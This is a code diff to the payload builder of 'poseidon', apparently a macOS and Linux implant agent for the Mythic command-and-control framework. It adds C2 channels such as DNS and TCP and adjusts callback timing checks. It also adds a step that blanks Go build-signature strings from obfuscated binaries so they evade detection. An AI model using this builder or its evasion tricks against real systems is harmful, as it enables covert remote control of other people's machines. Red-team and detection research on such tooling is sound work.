@@ -20,7 +20,7 @@ import (
 	"time"
 )
 
-const version = "2.1.9"
+const version = "2.2.18"
 
 type sleepInfoStruct struct {
 	Interval int       `json:"interval"`
@@ -28,16 +28,21 @@ type sleepInfoStruct struct {
 	KillDate time.Time `json:"killdate"`
 }
 
+var badSigs = [][]byte{
+	{'G', 'o', ' ', 'b', 'u', 'i', 'l', 'd'},
+	{'g', 'o', '.', 'b', 'u', 'i', 'l', 'd'},
+}
 var payloadDefinition = agentstructs.PayloadType{
 	Name:                                   "poseidon",
+	SemVer:                                 version,
 	FileExtension:                          "bin",
 	Author:                                 "@xorrior, @djhohnstein, @Ne0nd0g, @its_a_feature_",
 	SupportedOS:                            []string{agentstructs.SUPPORTED_OS_LINUX, agentstructs.SUPPORTED_OS_MACOS},
 	Wrapper:                                false,
 	CanBeWrappedByTheFollowingPayloadTypes: []string{},
 	SupportsDynamicLoading:                 false,
-	Description:                            fmt.Sprintf("A fully featured macOS and Linux Golang agent.\nVersion %s\nNeeds Mythic 3.3.0+", version),
-	SupportedC2Profiles:                    []string{"http", "websocket", "poseidon_tcp", "dynamichttp", "webshell", "httpx"},
+	Description:                            fmt.Sprintf("A fully featured macOS and Linux Golang agent.\nNeeds Mythic 3.3.0+\nNOTE: P2P not compatible with v2.1 agents!"),
+	SupportedC2Profiles:                    []string{"http", "websocket", "tcp", "dynamichttp", "webshell", "httpx", "dns"},
 	MythicEncryptsData:                     true,
 	BuildParameters: []agentstructs.BuildParameter{
 		{
@@ -62,6 +67,7 @@ var payloadDefinition = agentstructs.PayloadType{
 			Required:      false,
 			DefaultValue:  false,
 			ParameterType: agentstructs.BUILD_PARAMETER_TYPE_BOOLEAN,
+			GroupName:     "egress",
 		},
 		{
 			Name:          "garble",
@@ -82,7 +88,8 @@ var payloadDefinition = agentstructs.PayloadType{
 			Description:   "Prioritize the order in which egress connections are made (if including multiple egress c2 profiles)",
 			Required:      false,
 			ParameterType: agentstructs.BUILD_PARAMETER_TYPE_ARRAY,
-			DefaultValue:  []string{"http", "websocket", "dynamichttp"},
+			DefaultValue:  []string{"http", "websocket", "dynamichttp", "httpx"},
+			GroupName:     "egress",
 		},
 		{
 			Name:          "egress_failover",
@@ -91,6 +98,7 @@ var payloadDefinition = agentstructs.PayloadType{
 			ParameterType: agentstructs.BUILD_PARAMETER_TYPE_CHOOSE_ONE,
 			Choices:       []string{"failover"},
 			DefaultValue:  "failover",
+			GroupName:     "egress",
 		},
 		{
 			Name:          "failover_threshold",
@@ -98,6 +106,7 @@ var payloadDefinition = agentstructs.PayloadType{
 			Required:      false,
 			ParameterType: agentstructs.BUILD_PARAMETER_TYPE_NUMBER,
 			DefaultValue:  10,
+			GroupName:     "egress",
 		},
 		{
 			Name:          "static",
@@ -105,6 +114,18 @@ var payloadDefinition = agentstructs.PayloadType{
 			Required:      false,
 			ParameterType: agentstructs.BUILD_PARAMETER_TYPE_BOOLEAN,
 			DefaultValue:  false,
+			SupportedOS:   []string{agentstructs.SUPPORTED_OS_LINUX},
+		},
+	},
+	SupportsMultipleC2InBuild: true,
+	C2ParameterDeviations: map[string]map[string]agentstructs.C2ParameterDeviation{
+		"http": {
+			"get_uri": {
+				Supported: false,
+			},
+			"query_path_name": {
+				Supported: false,
+			},
 		},
 	},
 	BuildSteps: []agentstructs.BuildStep{
@@ -140,24 +161,20 @@ var payloadDefinition = agentstructs.PayloadType{
 					atLeastOneCallbackWithinRange = true
 					continue
 				}
-				if activeC2 == "poseidon_tcp" {
+				if activeC2 == "tcp" {
 					atLeastOneCallbackWithinRange = true
 					continue
 				}
-				minAdd := sleepInfo[activeC2].Interval
 				maxAdd := sleepInfo[activeC2].Interval
 				if sleepInfo[activeC2].Jitter > 0 {
-					// minimum would be sleep_interval - (sleep_jitter % of sleep_interval)
-					minAdd = minAdd - ((sleepInfo[activeC2].Jitter / 100) * (sleepInfo[activeC2].Interval))
 					// maximum would be sleep_interval + (sleep_jitter % of sleep_interval)
 					maxAdd = maxAdd + ((sleepInfo[activeC2].Jitter / 100) * (sleepInfo[activeC2].Interval))
 				}
 				maxAdd *= 2 // double the high end in case we're on a close boundary
-				earliest := callback.LastCheckin.Add(time.Duration(minAdd) * time.Second)
 				latest := callback.LastCheckin.Add(time.Duration(maxAdd) * time.Second)
-
-				if callback.LastCheckin.After(earliest) && callback.LastCheckin.Before(latest) {
+				if time.Now().UTC().Before(latest) {
 					atLeastOneCallbackWithinRange = true
+					break
 				}
 			}
 			response.Callbacks = append(response.Callbacks, agentstructs.PTCallbacksToCheckResponse{
@@ -269,18 +286,6 @@ func build(payloadBuildMsg agentstructs.PayloadBuildMessage) agentstructs.Payloa
 					return payloadBuildResponse
 				}
 				initialConfig[key] = headers
-				/*
-					if jsonBytes, err := json.Marshal(headers); err != nil {
-						payloadBuildResponse.Success = false
-						payloadBuildResponse.BuildStdErr = err.Error()
-						return payloadBuildResponse
-					} else {
-						stringBytes := string(jsonBytes)
-						stringBytes = strings.ReplaceAll(stringBytes, "\"", "\\\"")
-						ldflags += fmt.Sprintf(" -X '%s.%s_%s=%s'", poseidon_repo_profile, payloadBuildMsg.C2Profiles[index].Name, key, stringBytes)
-					}
-
-				*/
 			} else if key == "raw_c2_config" {
 				agentConfigString, err := payloadBuildMsg.C2Profiles[index].GetStringArg(key)
 				if err != nil {
@@ -312,13 +317,7 @@ func build(payloadBuildMsg agentstructs.PayloadBuildMessage) agentstructs.Payloa
 					}
 				}
 				initialConfig[key] = tomlConfig
-				/*
-					agentConfigString = strings.ReplaceAll(string(configData.Content), "\\", "\\\\")
-					agentConfigString = strings.ReplaceAll(agentConfigString, "\"", "\\\"")
-					agentConfigString = strings.ReplaceAll(agentConfigString, "\n", "")
-					ldflags += fmt.Sprintf(" -X '%s.%s_%s=%s'", poseidon_repo_profile, payloadBuildMsg.C2Profiles[index].Name, key, agentConfigString)
-				*/
-			} else if slices.Contains([]string{"callback_jitter", "callback_interval", "callback_port", "port", "callback_port", "failover_threshold"}, key) {
+			} else if slices.Contains([]string{"callback_jitter", "callback_interval", "callback_port", "port", "callback_port", "failover_threshold", "max_query_length"}, key) {
 
 				val, err := payloadBuildMsg.C2Profiles[index].GetNumberArg(key)
 				if err != nil {
@@ -353,7 +352,7 @@ func build(payloadBuildMsg agentstructs.PayloadBuildMessage) agentstructs.Payloa
 				} else {
 					initialConfig[key] = val
 				}
-			} else if slices.Contains([]string{"callback_domains"}, key) {
+			} else if slices.Contains([]string{"callback_domains", "domains"}, key) {
 				val, err := payloadBuildMsg.C2Profiles[index].GetArrayArg(key)
 				if err != nil {
 					payloadBuildResponse.Success = false
@@ -452,7 +451,7 @@ func build(payloadBuildMsg agentstructs.PayloadBuildMessage) agentstructs.Payloa
 	}
 	command += "GOGARBLE=* "
 	if garble {
-		command += "/go/bin/garble -tiny -literals -debug -seed random build "
+		command += "garble -tiny -literals -debug -seed random build "
 	} else {
 		command += "go build "
 	}
@@ -634,6 +633,16 @@ func build(payloadBuildMsg agentstructs.PayloadBuildMessage) agentstructs.Payloa
 			payloadBuildResponse.UpdatedFilename = &updatedFilename
 		}
 	} else {
+		if garble {
+			for i, _ := range badSigs {
+				replacement := make([]byte, len(badSigs[i]))
+				for j, _ := range replacement {
+					replacement[j] = ' ' // keep same size, just change to spaces
+				}
+				payloadBytes = bytes.ReplaceAll(payloadBytes, badSigs[i], replacement)
+			}
+
+		}
 		payloadBuildResponse.Payload = &payloadBytes
 		payloadBuildResponse.Success = true
 		payloadBuildResponse.BuildMessage = "Successfully built payload!"
